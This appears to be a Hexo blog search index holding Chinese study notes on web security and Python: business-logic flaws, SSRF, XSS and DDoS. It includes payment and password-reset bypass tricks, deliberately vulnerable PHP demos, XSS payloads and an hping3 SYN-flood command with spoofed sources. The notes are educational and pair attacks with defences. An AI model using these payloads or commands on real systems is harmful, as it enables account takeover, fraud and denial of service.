<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[业务逻辑漏洞]]></title>
    <url>%2F2019%2F12%2F22%2F%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[常规漏洞： 1、编码阶段产生，开发新手容易产生 2、相对易发现 3、容易防护，相对难利用 业务逻辑漏洞: 1、设计阶段产生 2、相对难发现 3、难以防护，相对易利用 相同点：信息泄露，资金损失 逻辑漏洞产生的原因： 1、第三方逻辑缺陷 2、开发水平对安全认识程度 3、没有在设计初期进行安全审计 电商业务为例的业务场景： 1、注册 2、登录 3、提交订单 4、购买支付 5、抽奖活动 6、个人信息相关 7、代金券/优惠券 8、找回密码 业务逻辑未授权1、site：aaa.com 2、域名爆破 3、端口及banner(redis、运维后台) 4、域名关联（whois查询） 登录与账户图形验证码：1、失效 2、空密码登录 短信验证码：1、循环使用 2、无数次限制 账号登录回显与注册明文密码登录账号及其他个人信息篡改密码重置1、忘记密码 2、重置时使用现有密码 越权前、后台订单遍历 商家资质信息遍历 取消订单 恶意刷评 支付金额篡改 充值、体现 数量、商品/优惠id篡改 API参数校验不完善（三个参数填写一个即可） 短信、邮箱轰炸 关键参数不加密（订单、商家资质id） 支付逻辑漏洞场景总结列举p1.抓包直接改价格 。 p2.请求链接里面改价格 。 p3.改商品数量如充值会员-2年、正负值对冲。 p4.有的金额不能改但能改运费金额。 p5.构造请求链接后面加订单号，直接访问该链接就能下单。 p6.请求重放，多次下单。 p7.参数污染 请求没该参数，却返回该参数，可请求该参数污染返回值。 p等其它姿势… 支付逻辑漏洞修复建议之多重校验流程图 支付逻辑漏洞修复建议总结p1.和银行交易时，做数据签名，对用户金额和订单签名 p2.敏感参数不要明文放在URL中 p3.服务端效验客户端提交的参数 p4.在服务端计算金额的时候，一定要判断是否为正数。 p5.支付过程中加一个服务器生成的key，用户校验参数有没有被串改。 p6.如果一定需要用URL传递相关参数，建议进行后端的签名验证 p7.订单金额和充值接口返回的数据进行校验。 p8.提交订单时后台判断单价是否与数据库中相符，如不符则返回错误。 p9.支付时应从服务器拉取数据，而不是直接读客户端的值！！ 越权漏洞修复建议之身份认证流程图 越权漏洞修复建议总结1、采用成熟的权限管理框架，如spring security。 2、用户进行访问操作的凭证（如用户ID、产品号码、订单流水号等）优先采用在服务端关联 ​ session或加密后放在session中的方式获取。 3、必须采用表单或其他参数提交用户进行访问操作的凭证（如用户ID、产品号码、订单流水号 ​ 等）时，应尽可能采用难以猜测的构造方式（增加字母及随机数字等）或采用复杂的加密算法 ​ 加密后提交，应对客户端提交的凭证与会话的权限进行严格的验证，如提交的产品号码是否为 ​ 隶属于登录用户的产品号码。 4、对管理功能模块进行严格的权限验证，如非必要建议不对互联网开放或进行网络层的访问控 ​ 制 未授权访问1、某网站未授权访问泄露重要信息 2、未授权访问之redis、MongoDB等.. predis未授权访问产生的原因： redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他 非信任来源ip访问等相关安全策略，直接暴露在公网；没有设置密码认证（一般为空），可以免密码远程登录redis服务。 p p漏洞的危害： p1.攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据； p2.攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件； p3.最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器 ​ 修复建议： 1、默认只对本地开放 bind 127.0.0.1 2、添加登陆密码 3、在需要对外开放的时候修改默认端口 更多未授权访问漏洞MongoDB、Hadoop、CouchDB等参考：https://www.secpulse.com/archives/61101.html 密码重置漏洞场景总结列举p1.密码修改页面可以预测。 p2.验证码可以爆破 。 p3.密码重置验证码接收帐号由客户端决定。 p4.修改返回包绕过验证码找回密码。 p5.重置密码新的密码出现在返回数据包中。 p6.密码重置验证码出现在返回数据包中。 p7.密码重置验证码多人公用 自己的验证码修改别人的密码。 p8.测试A输入验证码到输入新密码页面，然后B点击发送验证码，在A页面继续操作，实际改的是B的密码。 p9.利用自己邮箱/手机号码，获取到正确验证码。然后输入正确验证码，用户名改变，然后去掉检测用户名的参数，就可以跳到重置密码页面，而且重置别人的。 p10.获取验证码是通过验证码实例化获取，如何从其他地方获取到验证码，然后用这验证码去重置密码，也是可行的。例如，登录处获取到验证码，然后得到的验证码用到重置密码处，就成功通过验证了。 p等其它姿势… 密码重置漏洞修复建议总结p1.减少验证码有效时间 p2 使用后即销毁 p3 增加验证码复杂程序 p4 限制该功能单个ip提交频率 p5 对重要参数加入验证码同步信息或时间戳； p6 重置密码后，新密码不应返回在数据包中。 p7 接收验证码的帐号由服务端提供，不能信任客户端提交的数据 p8 服务端校验短信验证码后应通过 cookie 记录状态，不应在前端通过状态参数判断。另外，服务端应限制枚举等恶意请求。 p9 密码重置链接中 token 尽可能随机化，若用常规加密算法，一定用客户端无法查看且猜测的因子作为盐值。另外，服务端应限制枚举等恶意请求。]]></content>
  </entry>
  <entry>
    <title><![CDATA[文件上传]]></title>
    <url>%2F2019%2F12%2F18%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2F</url>
    <content type="text"><![CDATA[参考链接：https://rj45mp.github.io/%E4%BB%8Eupload-labs%E5%AD%A6%E4%B9%A0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/]]></content>
  </entry>
  <entry>
    <title><![CDATA[SSRF相关]]></title>
    <url>%2F2019%2F12%2F17%2FSSRF%E7%9B%B8%E5%85%B3%2F</url>
    <content type="text"><![CDATA[什么是SSRF?SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。 形成原因漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 易产生SSRF的地方 分享：通过url地址分享网页内容 通过url地址加载或者下载图片 从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed） 数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB） 文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML） Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP） 其他调用url或者类似出现==站内站==的情况，能够对外发起网络请求的地方，就可能存在 SSRF 漏洞 在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。 根据远程 URL 上传，静态资源图片等，这些会请求远程服务器的资源。 数据库的比如 mongodb 的 copyDatabase 函数。 邮件系统就是接收邮件服务器地址这些地方。 文件就找 ImageMagick，xml 这些。 从 URL 关键字中寻找，比如：source,share,link,src,imageurl,target 等。 php后端实现1、file_get_contents 12345678910&lt;?phpif (isset($_POST[&apos;url&apos;])) &#123; $content = file_get_contents($_POST[&apos;url&apos;]); $filename =&apos;./images/&apos;.rand().&apos;;img1.jpg&apos;; file_put_contents($filename, $content); echo $_POST[&apos;url&apos;]; $img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;; &#125;echo $img;?&gt; 这段代码使用 file_get_contents 函数从用户指定的 URL 获取图片。然后把它用一个随机文件名保存在硬盘上，并展示给用户。 2、fsockopen() 1234567891011121314151617181920&lt;?php function GetFile($host,$port,$link) &#123; $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) &#123; echo &quot;$errstr (error number $errno) \n&quot;; &#125; else &#123; $out = &quot;GET $link HTTP/1.1\r\n&quot;; $out .= &quot;Host: $host\r\n&quot;; $out .= &quot;Connection: Close\r\n\r\n&quot;; $out .= &quot;\r\n&quot;; fwrite($fp, $out); $contents=&apos;&apos;; while (!feof($fp)) &#123; $contents.= fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125; &#125;?&gt; 这段代码使用 fsockopen 函数实现获取用户制定 URL 的数据（文件或者 HTML）。这个函数会使用 socket 跟服务器建立 TCP 连接，传输原始数据。 3、curl_exec() 123456789101112131415&lt;?php if (isset($_POST[&apos;url&apos;])) &#123; $link = $_POST[&apos;url&apos;]; $curlobj = curl_init(); curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($curlobj); curl_close($curlobj); $filename = &apos;./curled/&apos;.rand().&apos;.txt&apos;; file_put_contents($filename, $result); echo $result;&#125;?&gt; 使用 curl 获取数据。 SSRF利用 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息 攻击运行在内网或本地的应用程序（比如溢出） 对内网 WEB 应用进行指纹识别，通过访问默认文件实现 攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli，redis等） 利用 file 协议读取本地文件等 其中file,dict,gopher协议常用。 1. 利用 file 协议读取本地文件此处应有实验 2. 利用dict协议探测端口此处应有实验 3. 利用gopher协议Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面 此处应有实验 稍复杂一点的情况利用gopher攻击内网中的一些有漏洞的应用等，如长亭文章中所说，利用gopher协议攻击redis应用。主要攻击 redis、discuz、fastcgi、memcache、内网脆弱应用这几类应用 防御手段 限制协议为 HTTP、HTTPS，需求不需要，就不要开类似gopher，file，ftp协议 禁止 30x 跳转 设置 URL 白名单或者限制内网 IP 服务端需要鉴权（Cookies &amp; User：Pass）不能完美利用 参考链接：http://v0w.top/2018/11/23/SSRF-notes/]]></content>
  </entry>
  <entry>
    <title><![CDATA[XSS相关]]></title>
    <url>%2F2019%2F12%2F16%2FXSS%E7%9B%B8%E5%85%B3%2F</url>
    <content type="text"><![CDATA[什么是XSS?Cross Site Scripting，跨站脚本攻击,为了和层叠样式表（Cascading Style Sheet，CSS）区分，在WEB安全叫XSS。 简述：XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 成因通过在用户端注入恶意的可执行脚本，若服务器对用户的输入不进行处理或处理不严，则浏览器就会直接执行用户注入的脚本。 危害攻击者通过Web应用程序发送恶意代码，一般以浏览器脚本的形式发送给不同的终端用户。当一个Web程序的用户输入点没有进行校验和编码，将很容易的导致 XSS 。 网络钓鱼，包括获取各类用户账号； 窃取用户 cookies 资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作； 劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、电子邮件等； 强制弹出广告页面、刷流量等； 网页挂马； 进行恶意操作，如任意篡改页面信息、删除文章等； 进行大量的客户端攻击，如ddos等； 获取客户端信息，如用户的浏览历史、真实ip、开放端口等； 控制受害者机器向其他网站发起攻击； 结合其他漏洞，如csrf,实施进一步危害； 提升用户权限，包括进一步渗透网站； 传播跨站脚本蠕虫等 易产生XSS的地方 数据交互的地方 get、post、cookies、headers 反馈与浏览 富文本编辑器 各类标签插入和自定义 数据输出的地方 用户资料 关键词、标签、说明 文件上传 分类1、反射型Reflected XSS Attacks 反射型 XSS 攻击，有些地方也称为非持续性 XSS ，这种攻击方式往往具有一次性，只在用户单击时触发。因为 payload 在触发时，是客户端渲染了服务器响应体，payload 经过了服务器，是与服务器产生了交互了的。 常见注入点网站的搜索栏、用户登录入口、输入表单等地方。 攻击方式反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。 alert(document.cookie) 漏洞复现构造反射型web界面 12345678910111213141516&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;XSS原理重现&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;xss_input&quot;&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;hr&gt; &lt;?php $xss = @$_GET[&apos;xss_input&apos;]; echo &quot;your input:&quot;.$xss.&quot;\n&quot;; ?&gt;&lt;/body&gt;&lt;/html&gt; POC:alert(document.cookie) 看一下源码，发现XSS语句已经嵌入到html中。 2、存储型Stored XSS Attacks 持久型XSS，比反射型XSS更具有威胁性，并且可能影响到Web服务器自身的安全。攻击脚本将被永久的存放在目标服务器的数据库或文件中。 常见注入点论坛、博客、留言板、网站的留言、评论、日志等交互处。 攻击方式攻击者在发帖或留言的过程中，将恶意脚本连同正常信息一起注入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行。 漏洞复现构造存储型XSS WEB界面 向后台数据库中存入POC save_xss.php 123456789101112131415161718192021222324252627&lt;html&gt;&lt;!--此网页用于向数据库中存入poc--&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;存储型XSS重现&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=&quot;&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;id&quot; value=&quot;id&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;xss_input&quot; value=&quot;text&quot;&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt; &lt;hr&gt;&lt;!--分割线--&gt; &lt;?php $id = @$_GET[&apos;id&apos;]; $xss = @$_GET[&apos;xss_input&apos;]; mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;); mysql_select_db(&quot;users&quot;); if($xss !== null)&#123; $sql = &quot;insert into xss(id,text)values(&apos;$id&apos;,&apos;$xss&apos;)&quot;; $result = mysql_query($sql); echo $result; &#125; ?&gt;&lt;/body&gt;&lt;/html&gt; save_xss2.php 显示数据中的内容 12345678910111213141516171819&lt;html&gt;&lt;!--此网页用于展示数据库中的所有数据--&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;存储型XSS重现2&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;?php mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;); mysql_select_db(&quot;users&quot;); $sql = &quot;select id,text from xss&quot;; $result = mysql_query($sql); while(@$row=mysql_fetch_array($result))&#123; echo $row[&apos;id&apos;].&quot;:&quot;.$row[&apos;text&apos;].&quot;&lt;/br&gt;&quot;; &#125; ?&gt;&lt;/body&gt;&lt;/html&gt; 前端访问： 插入前端html 中 3、DOM型DOM(Document object model)，使用 DOM 能够使程序和脚本能够动态访问和更新文档的内容、结构和样式。 DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象的一种漏洞。DOM型XSS是基于js上的。不需要与服务器进行交互。 注入点通过js脚本对对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以DOM动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器d端交互，它只发生在客户端处理数据的阶段。 攻击方式用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞 漏洞复现xss_dom.php 1234567891011121314151617&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;DOM型XSS重现&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt;&lt;!--js脚本--&gt; function test()&#123; var str = document.getElementById(&quot;text&quot;).value; document.getElementById(&quot;t&quot;).innerHTML = &quot;&lt;a href=&apos;&quot;+str+&quot;&apos;&gt;testLink&lt;/a&gt;&quot;; &#125; &lt;/script&gt; &lt;div id=&quot;t&quot;&gt;&lt;/div&gt; &lt;input type=&quot;text&quot; id=&quot;text&quot; =&quot;text&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;url&quot; onclick=&quot;test()&quot; /&gt;&lt;/body&gt;&lt;/html&gt; POC:1&apos;&gt;&lt;img src=# onerror=&quot;alert(document.cookie)&quot;&gt;&lt;&apos; 1&apos; onclick=alert(document.cookie) // 闭合href标签，注释后面多余内容，从而在用户点击超链接时，触发XSS。 测试总结 XSS类型 反射型 存储型 DOM型 触发过程 正常用户访问携带XSS的url 1.黑客构造XSS脚本 2.用户访问有XSS脚本的网站 正常用户访问携带XSS的url 存储位置 url 数据库 url 谁来输出 后端web 后端web 前端JS 输出位置 HTML响应 HTML响应 动态生成的DOM节点 黑盒测试尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些： URL的每一个参数URL本身表单搜索框 常见业务场景重灾区：评论区、留言区、个人信息、订单信息等针对型：站内信、网页即时通讯、私信、意见反馈存在风险：搜索框、当前目录、图片属性等 XSS防御XSS的根本就是向网站插入脚本代码，并使它运行的一种手段。防御方法分为两种，服务端防御和客户端防御。 服务端防御：1、HttpOnly可以限制javascript不能读取cookie，防止会话ID泄露2、处理富文本过滤掉富文本中的敏感标签如（script、iframe、form），还有敏感词（javascript:） 等等 客户端防御：1、输入检查防止输入敏感字段，如javascript、cookie等等2、检查输出脚本都是通过混淆在HTML当中，被当成html代码的一部分才得到执行。可以通过编码转义的办法，使得混淆在其中的脚本被当成文本处理，不会被执行。编码转义的话，有三种方法： 1. HTML encode 将字符转换成HTMLEntities，一般会转（&amp;、&lt;、&gt;、”、’、/）这6个字符。一般是在html标签属性输出的时候使用2. JavaScriptEncode 使用”\“对特殊字符进行转义。 一般在script标签输出、事件输出、CSS输出3. URL Encode 使用URLEncode的方法。 参考链接：http://v0w.top/2018/08/16/XSS%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/ https://xz.aliyun.com/t/4067]]></content>
  </entry>
  <entry>
    <title><![CDATA[python爬虫]]></title>
    <url>%2F2019%2F11%2F26%2Fpython%E7%88%AC%E8%99%AB%2F</url>
    <content type="text"><![CDATA[思考： Python爬虫请求图片需分三步: 1、请求图片资源 2、解析请求到的内容 3、将资源存到本地文件夹内 搜索Python爬虫所需要的第三方库 (1)请求网页图片资源需要用到HTTP请求库（requests） (2)解析请求到的内容需要用到HTML解析库（BeautifulSop） target:http://jandan.net/pic]]></content>
  </entry>
  <entry>
    <title><![CDATA[python学习]]></title>
    <url>%2F2019%2F11%2F25%2Fpython%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[1 Python3 的TXT 文件读写直接用with open 123with open(&quot;test.txt&quot;,&quot;r&quot;,&quot;utf-8&quot;) as f: # 为a+模式时，因为为追加模式，指针已经移到文尾，读出来的是一个空字符串。 ftext = f.read() # 一次性读全部成一个字符串 ftextlist = f.readlines() # 也是一次性读全部，但每一行作为一个子句存入一个列表 12345with open(&apos;IP.txt&apos;) as f: lines = [] for line in f.readlines(): line=line.strip(&apos;\n&apos;) lines.append(line) 2 Python3的EXCEL文件操作12345678910111213141516import xlrdimport xlwtbook = xlrd.open_workbook(&apos;ipslog.xls&apos;) # 打开一个excelsheet = book.sheet_by_index(0) # 根据顺序获取sheetworkbook = xlwt.Workbook(encoding = &apos;ascii&apos;)worksheet = workbook.add_sheet(&apos;My Worksheet&apos;, cell_overwrite_ok=True)for index,i in enumerate(sheet.get_rows()): ip = (str(i[4])[6:-1]) if ip in lines: for index2,info in enumerate(i): # print (i[index2]) worksheet.write(index3,index2,label = str(i[index2])[6:-1]) print (ip) index3 += 1 print (index3)workbook.save(&quot;new.xls&quot;)]]></content>
  </entry>
  <entry>
    <title><![CDATA[手工注入过程]]></title>
    <url>%2F2019%2F11%2F21%2F%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[1、手工测试之前搭建的不同注入环境，并记录 sql 语句，最终以获取 mysql 中的用户信息和当前表的信息为目标 2、思考通过注入漏洞可以做什么？ 3、思考注入漏洞如何防御？代码、服务器等角度 扩展学习：针对不同的注入漏洞，编写防御代码，具体如何防御自己决定，相关代码均记录在报告中，测试自己的防御代码是否可以绕过，并将过程进行记录 1 常规回显手工注入]]></content>
  </entry>
  <entry>
    <title><![CDATA[python正则表达式]]></title>
    <url>%2F2019%2F10%2F18%2Fpython%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[Python正则表达式1、正则表达式是什么 正则表达式使用单个字符串来描述，匹配一系列符合某个句法规则的字符串。 简单理解：就是对字符的检索匹配和处理 Python通过re模块提供对正则表达式的支持 1、先将正则表达式的字符串形式编译为Pattern实例； 2、使用pattern实例处理文本并获得匹配结果； 3、使用实例获得信息，进行其他操作； 正则表达式的基础知识 一般字符 . \ [] 贪婪模式和非贪婪模式 正则表达是通常用于在文本中查找匹配的字符串。Python的数量词默认是贪婪的，意思是总是尝试匹配尽可能多的字符； 非贪婪模式则相反，总是匹配尽可能少的的字符 例如： 正则表达式”ab*”如果用于查找”abbbc”,将找到”aabbb”. 而如果使用非贪婪方法”ab*?”,将找到”a”. 实际场景的练习使用：搜素某网站的所有课程名称 打开页面源代码，查看课程名称的位置前后的关键词 title = re.findall(r’&lt;div classs”courname” tiltle=”(.*?)’”onlick,html’) for i in tile ​ print i 多多练习 正则表达式是熟能生巧的东西 Python WEB编程利用Python与web交互 获取WEB信息 1、urllib 库的学习 获取网页信息，下载文件 requests 功能强大 第三方库 pip install requests 安华昂 2 、爬虫介绍 3、爬虫开发 web编程相关的库1、urllib库的使用 2、request 1、发送网络请求 r=request.get(‘http://www.baidu.com&#39;) 2、为url 传递参数 payload={‘KEY1’:’value1’,’key2’:’value2’} r= reuests.get(“http://httpbin.org&quot;) 2 爬虫介绍网络爬虫（又被称为网页蜘蛛，网络机器人，更经常的称为网页追逐者），是按照一定的规则，自动的抓取万维网信息的程序或者脚本 用爬虫最大的好处是批量自动化的获取和处理信息，对于宏观或者微观的情况可以多一个侧面去了解 功能：目录扫描，测试页面 管理员登录姐们 开发WEB漏洞扫描，绿盟漏扫的底层 扫描匹配漏洞库 爬虫爬取网页： 爬虫闯关： http://www.heibanke.com/lesson/crawler_ex00/ Python 多线程很多场景下 单线程效率低 1、线程和进程 2、tread模块 进程：进程是程序的一次执行，每个进程都有自己的地址空间，内存，数据站及其 线程：所有的线程运行在同一个进程当中，共享相同的运行环境，线程有开始顺序执行和结束三个部分 thread 模块 产生一个新的线程，在新的线程中用指定的参数和可选的kwads来调用这个函数 注意：使用这种方法时，一定要加time.sleep(),否则每个线程可能不执行 此方法还有一个确定，当遇到繁杂的问题时候，线程数不容易控制 threading 模块 比较稳定的方式，线程数可控 queue模块 Python网络编程使用方法简单 迅速，很多linux 系统默认集成python 环境 1、c/s架构 2、套接字-通信端点 3、pyhton网络编程 Python网络编程-socket模块 Python 读写excel 文件openpyxl 模块 工作簿（workbook） 表单 （worksheet） 行、列、单元格 （row,column,cell） 参考资料: https://www.runoob.com/python/python-reg-expressions.html https://www.zhihu.com/question/48219401 https://github.com/ziishaned/learn-regex 正则表达式工具： https://regexper.com/ https://regexr.com/ https://regex101.com/ 2、正则表达式的使用方法]]></content>
  </entry>
  <entry>
    <title><![CDATA[关于ddos]]></title>
    <url>%2F2019%2F10%2F04%2F%E5%85%B3%E4%BA%8Eddos%2F</url>
    <content type="text"><![CDATA[DDOS分类？资源消耗类型连接类主要表现为常用的连接耗尽，包括并发连接，新建连接，慢速连接，空连接等； 数据库查询主要表现为账号验证，表项查询，数据提交等； 网络：带宽 防火墙：吞吐量，并发连接 服务器：CPU.内存，I/O 应用：处理请求能力，对操作系统的使用权 带宽上限，设备性能上限，协议性能上限，应用性能上限，系统性能上限 利用漏洞崩溃系统 崩溃程序 网络流量型：利用网络通讯协议 SYN Flood ACK Flood ICMP Flood UDP Flood DNS Flood HTTP Flood 应用层 Http Flood DNS Flood Https Flood等 协议层 SYN Flood、ICMP Flood Tcp Flood、Udp Flood等 网络层 Arp攻击 hping详细参数解析： -h –help 显示帮助信息 -v –version 显示Hping的版本信息 -c –count 指定数据包的次数 -i –interval 指定发包间隔为多少毫秒，如-i m10：表示发包间隔为毫秒 –flood 尽最快发送数据包，不显示回复 指定所用的模式： 默认模式 TCP模式 -0 –rawip RAW IP 模式 -1 –icmp ICMP 模式 -2 –udp UDP 模式 -8 –scan 扫描模式. 例: hping –scan 1-30,70-90 -S www.target.host -9 –listen 监听模式 IP选项： -a –spoof 源地址欺骗 –rand-dest 随机目的地址模式 –rand-source 随机源地址模式 -t –ttl ttl值，默认为64 -N –id 指定id，默认是随机的 -W –winid 使用win*的id 字节顺序 -r –rel 相对的id区域 -f –frag 将数据包分片后传输（可以通过薄弱的acl（访问控制 列表）） -x –morefrag 设置更多的分片标记 -y –dontfrag 设置不加分片标记 -g –fragoff 设置分片偏移 -m –mtu 设置虚拟MTU, 当数据包&gt;MTU时要使用–frag 进行分片 -o –tos 指定服务类型，默认是0x00,，可以使用–tos help查看帮助 -G –rroute 包含RECORD_ROUTE选项并且显示路由缓存 –lsrr 释放源路记录 –ssrr 严格的源路由记录 -H –ipproto 设置协议范围，仅在RAW IP模式下使用 ICMP选项 -C –icmptype 指定icmp类型（默认类型为回显请求） -K –icmpcode 指定icmp编码（默认为0） –force-icmp 发送所有ICMP数据包类型（默认只发送可以支持的类型） –icmp-gw 针对ICMP数据包重定向设定网关地址（默认是0.0.0.0） –icmp-ts 相当于–icmp –icmptype 13（ICMP时间戳） –icmp-addr 相当于–icmp –icmptype 17（ICMP地址掩码） –icmp-help 显示ICMP的其它帮助选项 UDP/TCP选项 -s –baseport 基本源端口（默认是随机的） -p –destport 目的端口（默认为0），可同时指定多个端口 -k –keep 仍然保持源端口 -w –win 指定数据包大小，默认为64 -O –tcpoff 设置假的TCP数据偏移 -Q –seqnum 仅显示TCP序列号 -b –badcksum 尝试发送不正确IP校验和的数据包 许多系统在发送数据包时使用固定的IP校验和，因此你会得到不正确的UDP/TCP校验和. -M –setseq 设置TCP序列号 -L –setack 使用TCP的ACK（访问控制列表） -F –fin 使用FIN标记set FIN flag -S –syn 使用SNY标记 -R –rst 使用RST标记 -P –push 使用PUSH标记 -A –ack 使用 ACK 标记 -U –urg 使用URG标记 -X –xmas 使用 X 未用标记 (0x40) -Y –ymas 使用 Y 未用标记 (0x80) –tcpexitcode 最后使用 tcp-&gt;th_flags 作为退出代码 –tcp-timestamp 启动TCP时间戳选项来猜测运行时间 常规选项 -d –data 数据大小，默认为0 -E –file 从指定文件中读取数据 -e –sign 增加签名 -j –dump 以十六进行形式转存数据包 -J –print 转存可输出的字符 -B –safe 启用安全协议 -u –end 当通过- -file指定的文件结束时停止并显示，防止文件再从头开始 -T –traceroute 路由跟踪模式 –tr-stop 在路由跟踪模式下当收到第一个非ICMP数据包时退出 –tr-keep-ttl 保持源TTL，对监测一个hop有用 –tr-no-rtt 使用路由跟踪模式时不计算或显示RTT信息 ARS 数据包描述（新增加的内容，暂时还不稳定） –apd-send 发送用描述APD的数据包 TCP的正常连接建立和关闭 TCP报文段格式 TCP三次握手三次握手(Three-way Handshake)，是指建立一个TCP连接时，需要客户端和服务器总共发送3个包。 三次握手的目的是连接服务器指定端口，建立TCP连接,并同步连接双方的序列号和确认号并交换 TCP 窗口大小信息.在socket编程中，客户端执行connect()时。将触发三次握手。 第一次握手: 客户端发送一个TCP的SYN标志位置1的包指明客户打算连接的服务器的端口，以及初始序号X,保存在包头的序列号(Sequence Number)字段里 第二次握手: 服务器发回确认包(ACK)应答。即SYN标志位和ACK标志位均为1同时，将确认序号(Acknowledgement Number)设置为客户的ISN(初始序列号)加1以.即X+1。 第三次握手.客户端再次发送确认包(ACK) SYN标志位为0,ACK标志位为1.并且把服务器发来ACK的序号字段+1,放在确定字段中发送给对方.并且在数据段放写ISN的+1 TCP四次挥手 DDoS测试SYN Flood原理：攻击者通过发送大量伪造的带有SYN标志位的TCP报文，与目标主机建立了很多虚假的半开连接，在服务器返回SYN+ACK数据包后，攻击者不对其做出响应，也就是不返回ACK数据包给服务器，这样服务器就会一直等待直到超时。 在三次握手过程中，服务器发送SYN-ACK之后，收到客户端的ACK之前的TCP连接称为半连接(half-open connect).此时服务器处于Syn_RECV状态.当收到ACK后，服务器转入ESTABLISHED状态. 现象：使目标服务器连接资源耗尽、链路堵塞，从而达到拒绝服务的目的。 由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造的SYN包将长时间占用未连接队列，正常的SYN请求被丢弃，目标系统运行缓慢，严重者引起网络堵塞甚至系统瘫痪。 测试命令：hping3 -c 1000 -d 120 -S -p 80 –flood –rand-source 192.168.1.116 -c –count 指定数据包的次数 -d –data 数据大小，默认为0 -S –syn 使用SNY标记 -p –destport 目的端口（默认为0），可同时指定多个端口 统计分析： windows：netstat –an | find “SYN_RECEIVED” linux：netstat -n | awk 